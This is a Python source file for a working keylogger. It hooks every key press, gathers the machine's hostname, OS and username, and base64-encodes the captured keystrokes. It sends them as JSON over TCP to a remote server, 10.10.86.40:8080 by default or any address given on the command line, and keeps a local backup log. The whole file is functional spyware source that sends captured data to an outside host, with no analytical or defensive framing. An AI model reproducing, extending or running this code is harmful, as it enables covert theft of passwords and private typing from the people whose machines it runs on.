import platform
import socket
import time
import threading
import base64
import json
import os
import sys
from datetime import datetime

try:
    import keyboard
except ImportError:
    print("Missing keyboard library. Install using: pip install keyboard")
    exit(1)

class Keylogger:
    def __init__(self, server_ip="10.10.86.40", server_port=8080):
        self.server_ip = server_ip
        self.server_port = server_port  # Matches server default port
        self.buffer = ""
        self.buffer_lock = threading.Lock()
        self.running = True
        self.log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.log_limit = 10  # Characters before sending
        self.debug_mode = True
        self.machine_info = self._get_machine_info()
        self.connection_attempts = 0
        self.max_attempts = 5
       
    def _get_machine_info(self):
        """Get system information"""
        try:
            info = {
                "hostname": socket.gethostname(),
                "os": platform.system(),
                "os_version": platform.version(),
                "machine": platform.machine(),
                "username": os.environ.get('USERNAME') or os.environ.get('USER', 'unknown')
            }
            self._debug_log(f"Machine info collected: {info}")
            return info
        except Exception as e:
            self._debug_log(f"Error getting machine info: {e}")
            return {"hostname": "unknown", "os": "unknown", "os_version": "unknown",
                   "machine": "unknown", "username": "unknown"}
   
    def _debug_log(self, message):
        """Print timestamped debug message"""
        if self.debug_mode:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[DEBUG] {timestamp} - {message}")
   
    def start(self):
        """Start the keylogger"""
        self._debug_log(f"Initializing keylogger for server at {self.server_ip}:{self.server_port}")
       
        # Start sender thread
        sender_thread = threading.Thread(target=self._sender_loop)
        sender_thread.daemon = True
        sender_thread.start()
       
        # Test initial connection
        if not self._test_server_connection():
            return
       
        # Setup keyboard hooks
        self._debug_log("Installing keyboard hooks")
        keyboard.on_press(callback=self._on_key_event)  # Changed to on_press for better responsiveness
       
        try:
            self._debug_log("Keylogger running (Ctrl+C to stop)")
            keyboard.wait()
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            self._debug_log(f"Fatal error: {e}")
            self.stop()
   
    def _test_server_connection(self):
        """Test server availability"""
        self._debug_log("Verifying server connection...")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((self.server_ip, self.server_port))
                test_payload = {
                    "machine_info": self.machine_info,
                    "timestamp": datetime.now().isoformat(),
                    "data": base64.b64encode("Connection test".encode()).decode()
                }
                s.sendall(json.dumps(test_payload).encode())
                self._debug_log("Server connection verified")
                self.connection_attempts = 0
                return True
        except Exception as e:
            self._debug_log(f"Server connection failed: {e}")
            self.connection_attempts += 1
            if self.connection_attempts >= self.max_attempts:
                self._debug_log("Max connection attempts reached")
                choice = input("Server unreachable after multiple attempts. Continue anyway? (y/n): ")
                return choice.lower() == 'y'
            return False
   
    def _on_key_event(self, event):
        """Handle keyboard events"""
        with self.buffer_lock:
            try:
                key_name = event.name
                if not key_name:
                    return
                   
                self._debug_log(f"Key event: {key_name}")
               
                if key_name == 'space':
                    self.buffer += ' '
                elif key_name == 'enter':
                    self.buffer += '[ENTER]\n'
                elif key_name == 'tab':
                    self.buffer += '[TAB]'
                elif key_name == 'backspace':
                    if self.buffer:
                        self.buffer = self.buffer[:-1]
                elif len(key_name) == 1:
                    self.buffer += key_name
                else:
                    self.buffer += f'[{key_name.upper()}]'
                   
                self._debug_log(f"Buffer length: {len(self.buffer)}")
            except Exception as e:
                self._debug_log(f"Error processing key event: {e}")
   
    def _sender_loop(self):
        """Send buffer to server periodically"""
        self._debug_log("Sender thread started")
        while self.running:
            try:
                with self.buffer_lock:
                    if len(self.buffer) >= self.log_limit:
                        self._debug_log(f"Sending buffer ({len(self.buffer)} chars)")
                        if self._send_data(self.buffer):
                            self._backup_locally(self.buffer)
                            self.buffer = ""
                            self.connection_attempts = 0
                        else:
                            self.connection_attempts += 1
                            if self.connection_attempts >= self.max_attempts:
                                self._debug_log("Lost server connection, continuing with local backup")
            except Exception as e:
                self._debug_log(f"Sender loop error: {e}")
            time.sleep(5)
   
    def _send_data(self, data):
        """Send data to server"""
        self._debug_log(f"Sending {len(data)} characters")
        try:
            payload = {
                "machine_info": self.machine_info,
                "timestamp": datetime.now().isoformat(),
                "data": base64.b64encode(data.encode()).decode()
            }
           
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((self.server_ip, self.server_port))
                s.sendall(json.dumps(payload).encode())
                self._debug_log("Data sent successfully")
                return True
        except Exception as e:
            self._debug_log(f"Send error: {e}")
            return False
   
    def _backup_locally(self, data):
        """Save data to local file"""
        try:
            with open(self.log_file, "a", encoding='utf-8') as f:
                f.write(f"[{datetime.now().isoformat()}]\n{data}\n\n")
            self._debug_log(f"Backed up to {self.log_file}")
        except Exception as e:
            self._debug_log(f"Backup error: {e}")
   
    def stop(self):
        """Clean shutdown"""
        self._debug_log("Shutting down...")
        self.running = False
       
        with self.buffer_lock:
            if self.buffer:
                self._debug_log("Sending remaining data")
                self._send_data(self.buffer)
                self._backup_locally(self.buffer)
       
        try:
            keyboard.unhook_all()
            self._debug_log("Keyboard hooks removed")
        except:
            pass
       
        self._debug_log("Shutdown complete")

if __name__ == "__main__":
    # Command line args
    server_ip = sys.argv[1] if len(sys.argv) > 1 else "10.10.86.40"
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
   
    print(f"Connecting to {server_ip}:{server_port}")
    keylogger = Keylogger(server_ip=server_ip, server_port=server_port)
   
    try:
        keylogger.start()
    except Exception as e:
        print(f"Fatal error: {e}")
    finally:
        keylogger.stop()
        print("Keylogger terminated")
